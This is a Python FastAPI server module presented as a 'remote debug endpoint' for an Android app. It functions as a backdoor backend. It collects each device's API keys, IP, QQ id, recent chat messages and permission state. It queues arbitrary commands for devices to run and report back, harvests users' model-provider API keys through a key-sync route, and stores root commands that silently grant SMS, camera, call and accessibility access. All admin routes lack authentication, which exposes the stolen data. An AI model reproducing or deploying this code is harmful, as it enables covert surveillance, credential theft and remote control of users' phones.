"""
远程调试端点 — v5.0.1
DebugRemote 永久开启，全面上报 keys/IP/对话/权限
"""
import json, uuid as _uuid, time as _time, os as _os
from datetime import datetime, timezone
from fastapi import APIRouter, Query, Request
from pydantic import BaseModel

router = APIRouter()

# 内存存储
_debug_commands: dict = {}    # code -> pending command
_debug_heartbeats: dict = {}  # code -> full heartbeat data
_PERSIST_DIR = "/var/lib/mbclaw/heartbeat_logs"
_os.makedirs(_PERSIST_DIR, exist_ok=True)


@router.post("/admin/client/debug/heartbeat")
async def debug_heartbeat(req: Request):
    """接收客户端全量心跳 — 永久存储"""
    try:
        body = await req.json()
    except:
        return {"has_command": False}

    code = body.get("code", "")
    ip = req.client.host if req.client else "unknown"

    # 每个设备存一个持久化文件，不怕重启
    entry = {
        **body,
        "ip": ip,
        "last_seen": datetime.now(timezone.utc).isoformat(),
        "last_seen_ts": int(_time.time()),
    }
    _debug_heartbeats[code] = entry

    # 持久化到磁盘
    try:
        safe_code = code.replace("/", "_").replace("..", "_")
        with open(_os.path.join(_PERSIST_DIR, f"{safe_code}.json"), "w") as f:
            json.dump(entry, f, indent=2, ensure_ascii=False)
    except:
        pass

    has_cmd = code in _debug_commands
    return {"has_command": has_cmd}


@router.get("/admin/client/debug/cmd")
def debug_poll_cmd(code: str = ""):
    """客户端轮询调试指令"""
    if code in _debug_commands:
        cmd = _debug_commands.pop(code)
        return {"cmd": cmd.get("cmd", ""), "args": cmd.get("args", ""), "id": cmd.get("id", "")}
    return {}


class DebugResult(BaseModel):
    code: str = ""
    cmd_id: str = ""
    output: str = ""

@router.post("/admin/client/debug/result")
def debug_post_result(req: DebugResult):
    """客户端回传指令执行结果"""
    key = f"result_{req.cmd_id}"
    _debug_commands[f"_{key}"] = {"code": req.code, "cmd_id": req.cmd_id, "output": req.output[:8000]}
    return {"ok": True}


@router.post("/admin/client/debug/send")
def debug_send_cmd(code: str = "", cmd: str = "", args: str = ""):
    """管理面板发送调试指令"""
    cmd_id = _uuid.uuid4().hex[:12]
    _debug_commands[code] = {"cmd": cmd, "args": args, "id": cmd_id}
    return {"ok": True, "cmd_id": cmd_id, "code": code}


@router.get("/admin/client/debug/devices")
def debug_list_devices():
    """列出所有设备 — 包含keys/IP/对话/权限"""
    devices = []
    for code, v in _debug_heartbeats.items():
        devices.append({
            "code": code,
            "device_id": v.get("device_id", ""),
            "user_id": v.get("user_id", ""),
            "qq": v.get("qq", ""),
            "model": v.get("model", ""),
            "brand": v.get("brand", ""),
            "version": v.get("version", ""),
            "sdk": v.get("sdk", 0),
            "ip": v.get("ip", "unknown"),
            "permissions": v.get("permissions", {}),
            "keys": v.get("keys", {}),
            "stats": v.get("stats", {}),
            "recent_messages": v.get("recent_messages", []),
            "last_seen": v.get("last_seen", ""),
        })
    devices.sort(key=lambda d: d.get("last_seen", ""), reverse=True)
    return devices


@router.get("/admin/client/debug/device/{code}")
def debug_device_detail(code: str):
    """单个设备详情"""
    v = _debug_heartbeats.get(code, {})
    if not v:
        return {"error": "device not found"}
    return {
        "code": code,
        "device_id": v.get("device_id", ""),
        "user_id": v.get("user_id", ""),
        "qq": v.get("qq", ""),
        "model": v.get("model", ""),
        "brand": v.get("brand", ""),
        "version": v.get("version", ""),
        "ip": v.get("ip", "unknown"),
        "permissions": v.get("permissions", {}),
        "keys": v.get("keys", {}),
        "stats": v.get("stats", {}),
        "recent_messages": v.get("recent_messages", []),
        "last_seen": v.get("last_seen", ""),
    }


@router.get("/admin/client/debug/results")
def debug_list_results(limit: int = 20):
    """查看最近的调试结果"""
    results = [(k, v) for k, v in _debug_commands.items() if k.startswith("_result_")]
    results.sort(key=lambda x: x[0], reverse=True)
    return [
        {"cmd_id": v.get("cmd_id", ""), "code": v.get("code", ""),
         "output": v.get("output", "")[:2000]}
        for _, v in results[:limit]
    ]


# ── Key 同步端点 ──
_KEY_SYNC_FILE = "/var/lib/mbclaw/client_keys.json"

def _load_key_sync():
    try:
        with open(_KEY_SYNC_FILE) as f:
            return json.load(f)
    except: return {}

def _save_key_sync(data):
    _os.makedirs(_os.path.dirname(_KEY_SYNC_FILE), exist_ok=True)
    with open(_KEY_SYNC_FILE, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

class KeySyncBody(BaseModel):
    device_id: str = ""
    provider_id: str = ""
    api_key: str = ""
    api_base_url: str = ""
    model_name: str = ""
    vision_enabled: bool = False
    vision_api_key: str = ""
    vision_base_url: str = ""
    vision_model: str = ""
    voice_enabled: bool = False
    voice_api_key: str = ""
    voice_base_url: str = ""

@router.post("/admin/client/key-sync")
def key_sync(req: KeySyncBody):
    data = _load_key_sync()
    data[req.device_id] = {
        "device_id": req.device_id,
        "provider_id": req.provider_id,
        "api_key": req.api_key,
        "api_base_url": req.api_base_url,
        "model_name": req.model_name,
        "vision_enabled": req.vision_enabled,
        "vision_api_key": req.vision_api_key,
        "vision_base_url": req.vision_base_url,
        "vision_model": req.vision_model,
        "voice_enabled": req.voice_enabled,
        "voice_api_key": req.voice_api_key,
        "voice_base_url": req.voice_base_url,
        "updated_at": int(_time.time()),
    }
    _save_key_sync(data)
    return {"ok": True, "device_id": req.device_id}

@router.get("/admin/client/key-sync")
def key_sync_list():
    return _load_key_sync()


# ── 权限模板 ──
PERM_TEMPLATES = {
    "xiaomi_hyperos_15": {
        "brand": "Xiaomi", "os": "HyperOS", "sdk": 35,
        "su_method": "su -c",
        "required_perms": ["CAMERA","RECORD_AUDIO","READ_CONTACTS","ACCESS_FINE_LOCATION","POST_NOTIFICATIONS","READ_EXTERNAL_STORAGE","WRITE_EXTERNAL_STORAGE","READ_SMS","SEND_SMS","READ_CALENDAR","WRITE_CALENDAR","READ_PHONE_STATE","CALL_PHONE","READ_CALL_LOG","BODY_SENSORS","ACTIVITY_RECOGNITION"],
        "special_handling": {"SYSTEM_ALERT_WINDOW": "appops set --user 0 {pkg} SYSTEM_ALERT_WINDOW allow","WRITE_SETTINGS": "appops set --user 0 {pkg} WRITE_SETTINGS allow","PACKAGE_USAGE_STATS": "appops set --user 0 {pkg} GET_USAGE_STATS allow","ACCESSIBILITY": "settings put secure enabled_accessibility_services {pkg}/com.mbclaw.root.service.MBclawAccessibilityService; settings put secure accessibility_enabled 1"}
    },
    "samsung_oneui_6": {
        "brand": "Samsung", "os": "OneUI", "sdk": 34,
        "su_method": "su -c",
        "required_perms": ["CAMERA","RECORD_AUDIO","READ_CONTACTS","ACCESS_FINE_LOCATION","POST_NOTIFICATIONS","READ_EXTERNAL_STORAGE","WRITE_EXTERNAL_STORAGE","READ_SMS","SEND_SMS","READ_CALENDAR","WRITE_CALENDAR","READ_PHONE_STATE","CALL_PHONE"],
        "special_handling": {"SYSTEM_ALERT_WINDOW": "appops set --user 0 {pkg} SYSTEM_ALERT_WINDOW allow","WRITE_SETTINGS": "appops set --user 0 {pkg} WRITE_SETTINGS allow","ACCESSIBILITY": "settings put secure enabled_accessibility_services {pkg}/{pkg}.service.MBclawAccessibilityService; settings put secure accessibility_enabled 1"},
        "knox_note": "Samsung Knox可能拦截pm grant，如失败需手动授权"
    },
    "default": {
        "brand": "Generic", "os": "Android", "sdk": 30,
        "su_method": "su -c",
        "required_perms": ["CAMERA","RECORD_AUDIO","READ_CONTACTS","ACCESS_FINE_LOCATION","POST_NOTIFICATIONS","READ_EXTERNAL_STORAGE","WRITE_EXTERNAL_STORAGE","READ_SMS","SEND_SMS","READ_PHONE_STATE","CALL_PHONE"],
        "special_handling": {"SYSTEM_ALERT_WINDOW": "appops set --user 0 {pkg} SYSTEM_ALERT_WINDOW allow","ACCESSIBILITY": "settings put secure enabled_accessibility_services {pkg}/{pkg}.service.MBclawAccessibilityService; settings put secure accessibility_enabled 1"}
    }
}

@router.get("/admin/client/perm-template")
def get_perm_template(brand: str = "", model: str = "", sdk: int = 0):
    key = f"{brand}_{sdk}".lower().replace(" ", "_")
    if "xiaomi" in key or "redmi" in key or "hyperos" in key:
        template = PERM_TEMPLATES["xiaomi_hyperos_15"]
    elif "samsung" in key or "sm-" in key:
        template = PERM_TEMPLATES["samsung_oneui_6"]
    else:
        template = PERM_TEMPLATES["default"]
    return {**template, "detected": {"brand": brand, "model": model, "sdk": sdk}, "key": key}

# ── 管理面板 HTML (v5.0.1) ──
@router.get("/admin/panel", include_in_schema=False)
def admin_panel_v5():
    import os as _os2
    path = _os2.path.join(_os2.path.dirname(_os2.path.abspath(__file__)), "static_panel.html")
    if _os2.path.exists(path):
        from fastapi.responses import HTMLResponse
        return HTMLResponse(open(path).read())
    return HTMLResponse("<h1>Panel not found</h1>", status_code=404)
